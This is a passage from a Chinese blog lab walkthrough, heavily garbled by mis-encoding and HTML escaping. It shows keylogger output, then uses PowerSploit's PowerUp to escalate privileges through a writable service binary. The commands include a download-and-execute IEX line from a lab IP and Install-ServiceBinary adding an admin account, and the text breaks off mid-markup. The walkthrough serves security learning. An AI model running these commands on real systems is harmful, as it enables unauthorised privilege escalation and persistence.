&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;9&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;0&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;2&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;9&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;0&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;j&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;l&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;j&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:46&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;f&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:48&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;&amp;lt;Enter&amp;gt;&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:50&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;powerupæ”»å‡»æ¨¡å—å®æˆ˜1&#34;&gt;PowerUpæ”»å‡»æ¨¡å—å®æˆ˜1&lt;/h3&gt;
&lt;p&gt;PowerUpæ˜¯Privescæ¨¡å—ä¸‹çš„ä¸€ä¸ªè„šæœ¬ï¼ŒåŠŸèƒ½ç›¸å½“å¼ºå¤§ï¼Œæ‹¥æœ‰ä¼—å¤šç”¨æ¥å¯»æ‰¾ç›®æ ‡ä¸»æœºWindowsæœåŠ¡æ¼æ´è¿›è¡Œææƒçš„å®ç”¨è„šæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;é€šå¸¸ï¼Œåœ¨Windowsä¸‹å¯ä»¥é€šè¿‡å†…æ ¸æ¼æ´æ¥æå‡æƒé™ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šç¢°åˆ°æ— æ³•é€šè¿‡å†…æ ¸æ¼æ´ææƒæ‰€å¤„æœåŠ¡å™¨çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦åˆ©ç”¨è„†å¼±çš„WindowsæœåŠ¡ææƒï¼Œæˆ–è€…åˆ©ç”¨å¸¸è§çš„ç³»ç»ŸæœåŠ¡ï¼Œé€šè¿‡å…¶ç»§æ‰¿çš„ç³»ç»Ÿæƒé™æ¥å®Œæˆææƒç­‰ï¼Œæ­¤æ¡†æ¶å¯ä»¥åœ¨å†…æ ¸ææƒè¡Œä¸é€šçš„æ—¶å€™ï¼Œå¸®åŠ©æˆ‘ä»¬å¯»æ‰¾æœåŠ¡å™¨çš„è„†å¼±ç‚¹ï¼Œè¿›è€ŒåŒè„†å¼±ç‚¹å®ç°ææƒçš„ç›®çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¹¦ä¸­ç”¨åˆ°çš„æ˜¯ä¸€æ¬¾OmniServerçš„è½¯ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå·±æ¨¡æ‹Ÿä¸€ä¸ªç®€å•çš„å®éªŒç¯å¢ƒã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå®æˆ˜çš„æ„ä¹‰æ˜¯åœ¨ï¼šç®¡ç†å‘˜æˆ–è€…æ˜¯è½¯ä»¶æ·»åŠ äº†ä¸€ä¸ªå¯åŠ¨é¡¹ï¼Œè€Œä¸”è¿™ä¸ªè½¯ä»¶è¿˜æ˜¯ç»™äº†ç”¨æˆ·æ‰€æœ‰çš„æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹è¯¥æ–‡ä»¶è¿›è¡Œè¯»å†™æ”¹é€ æˆæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼Œå½“æœåŠ¡é‡å¯æˆ–è€…æ˜¯è®¡ç®—æœºé‡å¯æœåŠ¡è‡ªåŠ¨å¯åŠ¨çš„æ—¶å€™å°±èƒ½è§¦å‘æˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæ¥æ¨¡æ‹Ÿè·Ÿä¹¦ä¸­å·®ä¸å¤šçš„ç¯å¢ƒã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ·»åŠ æœåŠ¡&lt;/p&gt;
&lt;p&gt;æˆ‘è¿™é‡Œæ˜¯ç”¨æ¥Windowsç³»ç»Ÿé‡Œé¢çš„ç³»ç»Ÿæ–‡ä»¶&lt;code&gt;C:\Windows\hh.exe&lt;/code&gt;å½“ç„¶ä½ ä»¬ä¹Ÿå¯ä»¥ç”¨å…¶ä»–notepadã€cmdéƒ½è¡Œï¼ŒæŠŠå®ƒç§»åŠ¨åˆ°&lt;code&gt;C:\hh.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sc create hh binpath= C:\hh.exe type= own start= auto displayname= hh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æœåŠ¡ç®¡ç†å·¥å…·ä¸­æ–°å¢äº†ä¸€é¡¹åä¸º&lt;code&gt;hh&lt;/code&gt;çš„æœåŠ¡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;èµ‹äºˆæƒé™&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»¬ç»™ç”¨æˆ·ç»„å…·æœ‰&lt;code&gt;hh.exe&lt;/code&gt;å®Œå…¨çš„ä¿®æ”¹æƒé™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ–°å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªç”¨æˆ·ç”¨æ¥æµ‹è¯•ææƒçš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@ssw0rd&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®©ç”¨æˆ·æ‹¥æœ‰å…³æœºçš„æƒé™ï¼š&lt;/p&gt;
&lt;p&gt;æ‰“å¼€å®‰å…¨ç­–ç•¥ï¼šwin+R-&amp;gt;secpol.msc&lt;/p&gt;
&lt;p&gt;æ‰“å¼€æœ¬åœ°ç­–ç•¥-&amp;gt;ç”¨æˆ·æƒé™åˆ†é…-&amp;gt;å…³é—­ç³»ç»Ÿ-&amp;gt;æ·»åŠ ç”¨æˆ·æˆ–ç”¨æˆ·ç»„-&amp;gt;é«˜çº§-&amp;gt;ç«‹å³æŸ¥æ‰¾-&amp;gt;é€‰æ‹©testç”¨æˆ·&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœè¦è¿œç¨‹è¿æ¥è¿‡æ¥å°±åŠ å…¥è¿œç¨‹æ¡Œé¢ç”¨æˆ·ç»„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localgroup&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Remote Desktop Users&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬çš„æ¼æ´ç¯å¢ƒå°±éƒ¨ç½²æˆåŠŸäº†ï¼&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·è¿›è¡Œå®æˆ˜æ“ä½œï¼Œå…ˆä¸‹è½½å¹¶åŠ è½½æ”»å‡»è„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/Privesc/PowerUp.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œæ‰€æœ‰çš„æ£€æµ‹æ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-AllChecks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServiceName&lt;/span&gt;                     &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Path&lt;/span&gt;                            &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ModifiableFile&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ModifiableFilePermissions&lt;/span&gt;       &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WriteAttributes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Synchronize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ModifiableFileIdentityReference&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BUILTIN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;StartName&lt;/span&gt;                       &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LocalSystem&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;AbuseFunction&lt;/span&gt;                   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Install-ServiceBinary&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;hh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;CanRestart&lt;/span&gt;                      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;                            &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Check&lt;/span&gt;                           &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Modifiable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Files&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å·²ç»æ‰«æå‡ºæœåŠ¡&lt;code&gt;hh&lt;/code&gt;å­˜åœ¨æ¼æ´ï¼Œ&lt;code&gt;AbuseFunction&lt;/code&gt;æ˜¯åˆ©ç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä½¿ç”¨é‡Œé¢æ¨èçš„æ–¹æ³•å»åˆ©ç”¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Install-ServiceBinary&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;hh&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UserName&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Password&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;p@ssw0rd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Copy-Item&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¯¹è·¯å¾„&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€œ&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bak&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;çš„è®¿é—®è¢«æ‹’ç»&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ‰€åœ¨ä½ç½®&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;è¡Œ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;2854&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å­—ç¬¦&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;13&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;             &lt;span class=&#34;nb&#34;&gt;Copy-Item&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$ServicePath&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Destination&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$BackupPath&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Fo&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;             &lt;span class=&#34;p&#34;&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CategoryInfo&lt;/span&gt;          &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PermissionDenied&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FileInfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Copy-Item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UnauthorizedAccessException&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FullyQualifiedErrorId&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CopyFileInfoItemUnauthorizedAccessError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Commands&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;CopyItemCommand&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;è­¦å‘Š&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Error&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;backing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\hh.exe&amp;#39;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¯¹è·¯å¾„&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€œ&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bak&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;çš„è®¿é—®è¢«æ‹’ç»&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServiceName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Path&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;Command&lt;/span&gt;                                                                                  &lt;span class=&#34;n&#34;&gt;BackupPa&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                               &lt;span class=&#34;n&#34;&gt;th&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;-----------&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;-------&lt;/span&gt;                                                                                  &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@ssw0rd&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span 